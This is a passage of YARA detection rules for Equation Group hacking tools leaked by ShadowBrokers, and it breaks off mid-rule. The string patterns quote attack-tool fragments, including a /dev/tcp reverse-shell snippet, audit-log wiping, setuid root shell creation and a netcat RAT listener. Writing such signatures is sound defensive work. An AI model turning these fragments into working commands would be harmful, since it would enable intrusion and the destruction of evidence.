rule EquationGroup_morerats_client_Store_RID357A : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 16:14:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "[-] Failed to mmap file: %s" fullword ascii
      $s2 = "[-] can not NULL terminate input data" fullword ascii
      $s3 = "Missing argument for `-x'." fullword ascii
      $s4 = "[!] Value has size of 0!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 60KB and 2 of them )
} 

rule EquationGroup_watcher_linux_x86_64_v_3_3_0_RID36D6 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 17:12:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "forceprismheader" fullword ascii
      $s2 = "invalid option `" fullword ascii
      $s3 = "forceprism" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 900KB and all of them )
} 

rule EquationGroup_linux_exactchange_RID33CD : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 15:03:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "[+] looking for vulnerable socket" fullword ascii
      $x2 = "can't use 32-bit exploit on 64-bit target" fullword ascii
      $x3 = "[+] %s socket ready, exploiting..." fullword ascii
      $x4 = "[!] nothing looks vulnerable, trying everything" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )
} 

rule EquationGroup_x86_linux_exactchange_RID3512 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool set"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-09 15:57:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "kernel has 4G/4G split, not exploitable" fullword ascii
      $x2 = "[+] kernel stack size is %d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 1000KB and 1 of them )
} 

rule EquationGroup_emptycriss_RID3116 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file emptycriss"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "./emptycriss <target IP>" fullword ascii
      $s2 = "Cut and paste the following to the telnet prompt:" fullword ascii
      $s8 = "environ define TTYPROMPT abcdef" fullword ascii
   condition: 
      ( filesize < 50KB and 1 of them )
} 

rule EquationGroup_scripme_RID2FB6 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file scripme"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:08:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "running \\\"tcpdump -n -n\\\", on the environment variable \\$INTERFACE, scripted" fullword ascii
      $x2 = "Cannot read $opetc/scripme.override -- are you root?" ascii
      $x3 = "$ENV{EXPLOIT_SCRIPME}" ascii
      $x4 = "$opetc/scripme.override" ascii
   condition: 
      ( filesize < 30KB and 1 of them )
} 

rule EquationGroup_cryptTool_RID3093 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cryptTool"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:45:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "The encryption key is " fullword ascii
      $s2 = "___tempFile2.out" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 200KB and all of them )
} 

rule EquationGroup_dumppoppy_RID30B1 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file dumppoppy"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:50:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Unless the -c (clobber) option is used, if two RETR commands of the" fullword ascii
      $x2 = "mywarn(\"End of $destfile determined by \\\"^Connection closed by foreign host\\\"\")" fullword ascii
      $l1 = "End of $destfile determined by \"^Connection closed by foreign host" 
   condition: 
      ( filesize < 20KB and 1 of them )
} 

rule EquationGroup_Auditcleaner_RID3194 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file Auditcleaner"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:28:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "> /var/log/audit/audit.log; rm -f ." ascii
      $x2 = "Pastables to run on target:" ascii
      $x3 = "cp /var/log/audit/audit.log .tmp" ascii
      $l1 = "Here is the first good cron session from" fullword ascii
      $l2 = "No need to clean LOGIN lines." fullword ascii
   condition: 
      ( filesize < 300KB and 1 of them )
} 

rule EquationGroup_reverse_shell_RID3236 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file reverse.shell.script"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:55:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "sh >/dev/tcp/" ascii
      $s2 = " <&1 2>&1" fullword ascii
   condition: 
      ( filesize < 1KB and all of them )
} 

rule EquationGroup_tnmunger_RID3033 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file tnmunger"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:29:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "TEST: mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
      $s2 = "mungedport=%6d  pp=%d  unmunged=%6d" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 10KB and 1 of them )
} 

rule EquationGroup_ys_ratload_RID30F5 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ys.ratload.sh"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:02:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -x 9999\"" fullword ascii
      $x2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
      $x3 = "CALLBACK_PORT=32177" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 3KB and 1 of them )
} 

rule EquationGroup_eh_1_1_0_RID2F3F : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eh.1.1.0.0"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:49:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "usage: %s -e -v -i target IP [-c Cert File] [-k Key File]" fullword ascii
      $x2 = "TYPE=licxfer&ftp=%s&source=/var/home/ftp/pub&version=NA&licfile=" ascii
      $x3 = "[-l Log File] [-m save MAC time file(s)] [-p Server Port]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 100KB and 1 of them )
} 

rule EquationGroup_evolvingstrategy_1_0_1_RID354F : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file evolvingstrategy.1.0.1.1"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 16:07:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "chown root sh; chmod 4777 sh;" fullword ascii
      $s2 = "cp /bin/sh .;chown root sh;" fullword ascii
      $l1 = "echo clean up when elevated:" fullword ascii
      $x1 = "EXE=$DIR/sbin/ey_vrupdate" fullword ascii
   condition: 
      ( filesize < 4KB and 1 of them )
} 

rule EquationGroup_toast_v3_2_0_RID3116 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file toast_v3.2.0.1-linux"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:07:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x2 = "Del --- Usage: %s -l file -w wtmp -r user" fullword ascii
      $s5 = "Roasting ->%s<- at ->%d:%d<-" fullword ascii
      $s6 = "rbnoil -Roasting ->" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )
} 

rule EquationGroup_sshobo_RID2F51 : APT DEMO FILE T1021 T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sshobo"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:52:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1021, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Requested forwarding of port %d but user is not root." fullword ascii
      $x2 = "internal error: we do not read, but chan_read_failed for istate" fullword ascii
      $x3 = "~#  - list forwarded connections" fullword ascii
      $x4 = "packet_inject_ignore: block" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 600KB and all of them )
} 

rule EquationGroup_magicjack_v1_1_0_0_client_1_1_0_0_RID382D : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file magicjack_v1.1.0.0_client-1.1.0.0.py"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 18:10:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "result = self.send_command(\"ls -al %s\" % self.options.DIR)" fullword ascii
      $x2 = "cmd += \"D=-l%s \" % self.options.LISTEN_PORT" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 80KB and 1 of them )
} 

rule EquationGroup_packrat_RID2FA9 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file packrat"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:06:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x2 = "Use this on target to get your RAT:" fullword ascii
      $x3 = "$ratremotename && " fullword ascii
      $x5 = "$command = \"$nc$bindto -vv -l -p $port < ${ratremotename}\" ;" fullword ascii
   condition: 
      ( filesize < 70KB and 1 of them )
} 

rule EquationGroup_telex_RID2EE5 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file telex"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:34:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "usage: %s -l [ netcat listener ] [ -p optional target port instead of 23 ] <ip>" fullword ascii
      $x2 = "target is not vulnerable. exiting" fullword ascii
      $s3 = "Sending final buffer: evil_blocks and shellcode..." fullword ascii
      $s4 = "Timeout waiting for daemon to die.  Exploit probably failed." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of them )
} 

rule EquationGroup_calserver_RID308A : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file calserver"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:44:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "usage: %s <host> <port> e <contents of a local file to be executed on target>" fullword ascii
      $x2 = "Writing your %s to target." fullword ascii
      $x3 = "(e)xploit, (r)ead, (m)ove and then write, (w)rite" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of them )
} 

rule EquationGroup_porkclient_RID30FE : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file porkclient"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:03:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "-c COMMAND: shell command string" fullword ascii
      $s2 = "Cannot combine shell command mode with args to do socket reuse" fullword ascii
      $s3 = "-r: Reuse socket for Nopen connection (requires -t, -d, -f, -n, NO -c)" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of them )
} 

rule EquationGroup_electricslide_RID321F : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file electricslide"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:51:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Firing with the same hosts, on altername ports (target is on 8080, listener on 443)" fullword ascii
      $x2 = "Recieved Unknown Command Payload: 0x%x" fullword ascii
      $x3 = "Usage: eslide   [options] <-t profile> <-l listenerip> <targetip>" fullword ascii
      $x4 = "-------- Delete Key - Remove a *closed* tab" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 2000KB and 1 of them )
} 

rule EquationGroup_libXmexploit2_RID31F6 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file libXmexploit2.8"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:44:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage: ./exp command display_to_return_to" fullword ascii
      $s2 = "sizeof shellcode = %d" fullword ascii
      $s3 = "Execve failed!" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and 1 of them )
} 

rule EquationGroup_wrap_telnet_RID3168 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file wrap-telnet.sh"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:21:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "echo \"example: ${0} -l 192.168.1.1 -p 22222 -s 22223 -x 9999\"" fullword ascii
      $s2 = "-x [ port to start mini X server on DEFAULT = 12121 ]\"" fullword ascii
      $s3 = "echo \"Call back port2 = ${SPORT}\"" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 4KB and 1 of them )
} 

rule EquationGroup_elgingamble_RID313A : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file elgingamble"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "* * * * * root chown root %s; chmod 4755 %s; %s" fullword ascii
      $x2 = "[-] kernel not vulnerable" fullword ascii
      $x3 = "[-] failed to spawn shell: %s" fullword ascii
      $x4 = "-s shell           Use shell instead of %s" fullword ascii
   condition: 
      1 of them
} 

rule EquationGroup_cmsd_RID2E6A : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsd"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:13:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "usage: %s address [-t][-s|-c command] [-p port] [-v 5|6|7]" fullword ascii
      $x2 = "error: not vulnerable" fullword ascii
      $s1 = "port=%d connected! " fullword ascii
      $s2 = "xxx.XXXXXX" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 30KB and 1 of ( $x* ) ) or ( 2 of them )
} 

rule EquationGroup_ebbshave_RID3003 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ebbshave.v5"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:21:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "executing ./ebbnew_linux -r %s -v %s -A %s %s -t %s -p %s" fullword ascii
      $s2 = "./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772" fullword ascii
      $s3 = "version 1 - Start with option #18 first, if it fails then try this option" fullword ascii
      $s4 = "%s is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 20KB and 1 of them ) or ( 2 of them )
} 

rule EquationGroup_eggbasket_RID3070 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file eggbasket"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:39:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "# Building Shellcode into exploit." fullword ascii
      $x2 = "%s -w /index.html -v 3.5 -t 10 -c \"/usr/openwin/bin/xterm -d 555.1.2.2:0&\"  -d 10.0.0.1 -p 80" fullword ascii
      $x3 = "# STARTING EXHAUSTIVE ATTACK AGAINST " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
} 

rule EquationGroup_jparsescan_RID30ED : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jparsescan"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:00:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
      $s2 = "$gotsunos = ($line =~ /program version netid     address             service         owner/ );" fullword ascii
   condition: 
      ( filesize < 40KB and 1 of them )
} 

rule EquationGroup_sambal_RID2F33 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file sambal"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:47:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "+ Bruteforce mode." fullword ascii
      $s3 = "+ Host is not running samba!" fullword ascii
      $s4 = "+ connecting back to: [%d.%d.%d.%d:45295]" fullword ascii
      $s5 = "+ Exploit failed, try -b to bruteforce." fullword ascii
      $s7 = "Usage: %s [-bBcCdfprsStv] [host]" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 90KB and 1 of them ) or ( 2 of them )
} 

rule EquationGroup_pclean_v2_1_1_2_RID31EE : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file pclean.v2.1.1.0-linux-i386"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 13:43:31"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s3 = "** SIGNIFICANTLY IMPROVE PROCESSING TIME" fullword ascii
      $s6 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 40KB and all of them )
} 

rule EquationGroup_envisioncollision_RID33FA : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file envisioncollision"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 15:10:51"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "mysql \\$D --host=\\$H --user=\\$U --password=\\\"\\$P\\\" -e \\\"select * from \\$T" fullword ascii
      $x2 = "Window 3: $0 -Uadmin -Ppassword -i127.0.0.1 -Dipboard -c\\\"sleep 500|nc" fullword ascii
      $s3 = "$ua->agent(\"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\");" fullword ascii
      $s4 = "$url = $host . \"/admin/index.php?adsess=\" . $enter . \"&app=core&module=applications&section=hooks&do=install_hook\";" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x2123 and filesize < 20KB and 1 of ( $x* ) ) or ( 2 of them )
} 

rule EquationGroup_cmsex_RID2EE3 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file cmsex"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:33:41"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) " fullword ascii
      $x2 = "-i target ip address / hostname " fullword ascii
      $x3 = "Note: Choosing the correct target type is a bit of guesswork." fullword ascii
      $x4 = "Solaris rpc.cmsd remote root exploit" fullword ascii
      $x5 = "If one choice fails, you may want to try another." fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and 1 of ( $x* ) ) or ( 2 of them )
} 

rule EquationGroup_exze_RID2E7F : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file exze"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 11:17:01"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $s1 = "shellFile" fullword ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "zeke_remove" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and all of them )
} 

rule EquationGroup_DUL_RID2DA8 : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file DUL"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 10:41:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "?Usage: %s <shellcode> <output_file>" fullword ascii
      $x2 = "Here is the decoder+(encoded-decoder)+payload" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 80KB and 1 of them ) or ( all of them )
} 

rule EquationGroup_slugger2_RID2FEE : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file slugger2"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:18:11"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, FILE, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "usage: %s hostip port cmd [printer_name]" fullword ascii
      $x2 = "command must be less than 61 chars" fullword ascii
      $s1 = "__rw_read_waiting" fullword ascii
      $s2 = "completed.1" fullword ascii
      $s3 = "__mutexkind" fullword ascii
      $s4 = "__rw_pshared" fullword ascii
   condition: 
      ( uint16 ( 0 ) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ( $x* ) ) ) or ( all of them )
} 

rule EquationGroup_ebbisland_RID3067 : APT DEMO T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file ebbisland"
      author = "Florian Roth"
      reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
      date = "2017-04-08 12:38:21"
      score = 75
      customer = "demo"
      license = "CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/"
      tags = "APT, DEMO, T1136"
      minimum_yara = "1.7"
      
   strings:
      $x1 = "Usage: %s [-V] -t <target_ip> -p port" fullword ascii
      $x2 = "error - shellcode not as expected - unable to fix up" fullword ascii
      $x3 = "WARNING - core wipe mode - this will leave a core file on target" fullword ascii
      $x4 = "[-C] wipe target core file (leaves less incriminating core on failed target)" fullword ascii
      $x5 = "-A <jumpAddr> (shellcode address)" fullword ascii
      $x6 = "*** Insane undocumented incremental port mode!!! ***" fullword ascii
   condition: 
      filesize < 250KB and 1 of them
} 

rule EquationGroup_jackpop_RID2FAB : APT DEMO FILE T1136 {
   meta:
      description = "Equation Group hack tool leaked by ShadowBrokers- file jackpop"
      author = "Florian Roth"
